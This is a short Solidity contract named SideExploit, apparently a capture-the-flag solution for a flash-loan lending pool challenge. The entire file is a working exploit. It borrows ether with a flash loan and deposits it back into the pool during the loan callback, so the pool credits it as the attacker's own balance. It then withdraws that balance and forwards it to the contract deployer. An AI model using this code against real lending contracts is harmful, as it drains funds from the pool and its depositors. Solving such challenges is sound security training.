pragma solidity ^0.8.0;
// My own interface because I have too much time
interface ISideLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external; 
}

contract SideExploit {
    ISideLenderPool pool;
    uint256 amount;
    address owner;
    constructor(address poolAddress, uint256 argAmount) {
        amount = argAmount;
        pool = ISideLenderPool(poolAddress);
        owner = msg.sender;
    }
    // After successful loan, withdraws well earned funds :)
    function exploit() external{
        pool.flashLoan(amount);
        pool.withdraw();
    }
    // Called upon retrieval of ether, transfers to contract deployer
    receive () external payable{
        payable(owner).transfer(address(this).balance);
    }
    // Called by loan pool, deposits ether back as if it was owned before by contract
    function execute() external payable{
        pool.deposit{value: amount}();
    }
}